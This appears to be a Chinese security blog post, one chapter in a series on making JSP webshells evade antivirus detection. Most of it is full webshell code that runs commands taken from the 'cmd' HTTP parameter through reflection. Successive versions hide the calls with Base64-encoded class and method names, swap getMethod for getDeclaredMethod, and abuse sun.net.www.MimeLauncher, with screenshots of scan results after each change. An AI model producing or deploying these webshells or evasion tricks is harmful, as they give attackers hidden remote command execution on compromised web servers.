<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2DJ95HkgVjV2D08EKggJ3g)

反射免杀
====

本章主要讲解反射在 webshell 中的利用，以及反射绕过杀软的利用与原理

原始反射马
-----

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.lang.reflect.Field" %><%@ page import="java.io.*" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter("cmd");    Class<?> rt =Class.forName("java.lang.Runtime");  Method runtimeMethod = rt.getMethod("getRuntime");  Method method = rt.getMethod("exec", String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);  Process process = (Process) object;  InputStream in = process.getInputStream();  InputStreamReader resultReader = new InputStreamReader(in);  BufferedReader stdInput = new BufferedReader(resultReader);  String s = null;  while ((s = stdInput.readLine()) != null) {    out.println(s);  }%>
```

免杀效果:

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIQoQwlDnvAK6SyqolJDnicOo5aJAibRQ9R9ksRN3OOQRqvmUfPZiam0UcA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIq8wDCZbYiamN0QXiaANEy8JFft6ry7NmLnhrf2wraSHzECbemJGTxPJQ/640?wx_fmt=png)

特征太明显里面还有 java.lang.Runtime，getRuntime，exec 这些敏感内容，由于与反射相关的参数都是字符串，由此我们能操作的空间就很大了。

利用 base64 加解密敏感内容
-----------------

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));  Method runtimeMethod = rt.getMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));  Method method = rt.getMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);  Process process = (Process) object;  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }%>
```

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBI87MTS48CJW7evNRhupO81SaUpxesNvds7IbqNXuq9qpKl9FftV6IGg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBINNQ9eukiarS6jFz1byxFIREPKQZxRiacIPucvW9J9lHeSMiczPr0XCicNA/640?wx_fmt=png)

通过测试发现并非查杀的是与反射相关的所有函数，而是匹配是否存在 getMethod 函数，因此我们只需将 getMethod 改为 getDeclaredMethod 即可

getDeclaredMethod 替换 getMethod
------------------------------

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));  Method runtimeMethod = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));  Method method = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);  Process process = (Process) object;  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIJsfk3s3buYR2cw6J0zgZk2sBDVt5URZ5AV0FwyVP6HRGYWhEz3QktQ/640?wx_fmt=png)

可以看到正常运行

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBILO6OxMibmmq4xyq5KyYOP6GfLVIKkdsBG67ubjdhpCOaMG4OkTYNYsA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIVBsMnElCjyROS94j4JKuYcxa5dC1pLBXOGwRmlSo1ThnMpVa79K9ew/640?wx_fmt=png)

可以看到某盾依旧查杀，经过测试某盾查杀的是当存在反射函数又存在 Process 类的 getInputStream 方法时会被查杀，这种情况下，笔者并未找到太好的办法，要么就这些不回显，要么就利用之前文章写的免杀技巧。

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));  Method runtimeMethod = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));  Method method = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);%>
```

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIPYRdIog3IQ3VxaAy4OUc60icyLax9Zz5LgTm9y6ODSYhGCaLGFe3Jzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIjhianXve8wAI1LHjHujaYHiaW6Cn8VNRPL1OfBTBOVrvHEZ9RqIH1gVA/640?wx_fmt=png)

sun.net.www.MimeLauncher 免杀
---------------------------

在 sun.net.www.MimeLauncher 中存在一个 run 方法，而该 run 方法存在命令执行漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIicXBPw1JKHNoHa6stKa8uGyOJMC3lT0Kd6kgC90IXF9WEibvZ6kxe2Yw/640?wx_fmt=png)

本来打算将 MimeLauncher 放到前面内置函数免杀那篇文章上讲，由于 MimeLauncher 无法直接使用，需要借助反射进行调用，因此就笔者就将 MimeLauncher 放在反射免杀后讲，及本章

```
<%@ page import="java.io.*" %><%@ page import="java.net.URLConnection" %><%@ page import="java.net.URL" %><%@ page import="sun.net.www.MimeEntry" %><%@ page import="java.lang.reflect.Field" %><%@ page import="java.lang.reflect.Constructor" %><%@ page import="java.lang.reflect.Method" %><%@ page language="java" pageEncoding="UTF-8" %><%    String cmd = request.getParameter("cmd");    URLConnection urlConnection = new URL("http://127.0.0.1%s").openConnection();    MimeEntry mimeEntry = new MimeEntry("naihe");    Class meClass = MimeEntry.class;    Field field = meClass.getDeclaredField("command");    field.setAccessible(true);    Field field2 = meClass.getDeclaredField("tempFileNameTemplate");    field2.setAccessible(true);    field2.set(mimeEntry,"naihe%s567");    InputStream inputStream = new InputStream() {        @Override        public int read() throws IOException {            return -1;        }    };    Class mimeClass = Class.forName("sun.net.www.MimeLauncher");    Constructor mimeCon = mimeClass.getDeclaredConstructor(MimeEntry.class,URLConnection.class,            InputStream.class,String.class,String.class);    mimeCon.setAccessible(true);    Thread thread = (Thread) mimeCon.newInstance(mimeEntry, urlConnection, inputStream, "0","0");    Field field3 = mimeClass.getDeclaredField("execPath");    field3.setAccessible(true);    field3.set(thread,cmd);    Method m = mimeClass.getDeclaredMethod("run");    m.setAccessible(true);    m.invoke(thread);%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIicXBPw1JKHNoHa6stKa8uGyOJMC3lT0Kd6kgC90IXF9WEibvZ6kxe2Yw/640?wx_fmt=png)

类似 MimeLauncher 的类还有许多，适合大家去挖掘挖掘，利用时大概率会用到反射，就当练习练习反射相关的知识也是不错的选择

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBIZDGXGoBG2CpJMh240CsicDLdGwy37FOuqsHvuFGMkqArVtVPs2C3NlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7iaJ2bZlfJ3DdhSUOGd4MBI7GS1TbRenlib1icCympBLS5nccZ0EmgJFficKF1RekQFTbJ2XesNQuKYw/640?wx_fmt=png)

总结：
---

利用反射，不但可以将一些敏感的函数特征进行拆分，而且还能调用正常情况下不被允许调用的类。可以说只要杀软不直接上反射函数其实我们可以操作的空间就非常大了。

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

一款域信息收集神器



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502430&idx=1&sn=f78ce6eb3d3d2b855c90a538da12183c&chksm=ce6770e2f910f9f43fb0bbb80ea13311e75c2dc3af334176f935ef2807b5b1034f62cd5bec86&scene=21#wechat_redirect)

[

最新绕过 360 添加用户 | 红队蓝军祝您双节快乐



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502428&idx=1&sn=92ee477abbbdcfaba224cdcf4cab9d12&chksm=ce6770e0f910f9f6bcf4b241e30f31720bff5aa89f096b763c122435df092eecb8edc38dc664&scene=21#wechat_redirect)

[

域内批量获取敏感文件



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502357&idx=1&sn=afe9aa38b2386df73b8ac31c1f2a2c3b&chksm=ce6770a9f910f9bf3248d60a71cac48d58837c117fb96cc56007e12d46f698ed82f94936b36a&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（六）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502356&idx=1&sn=0c6fde644f97b26a20ed2cfed83f7ad9&chksm=ce6770a8f910f9be24b760ba0ca9e41b9368562c05c099f4caba118e476f57177df9b2d4d490&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（五）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502241&idx=1&sn=5c767ad655dd6914a3a594169dfeafc2&chksm=ce67731df910fa0b2d971eff4d356b443e9f21b3a99e2e074b62f0a74d55a1e0d5a5536ed777&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（四）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501017&idx=1&sn=aa602658159907822f7c59c85c427576&chksm=ce677e65f910f773422d910e57e8fa4cb2f0278b88319945839cd8f3a2262c6dc264e7767dcd&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（三）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[什么？你还不会 webshell 免杀？（一）](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)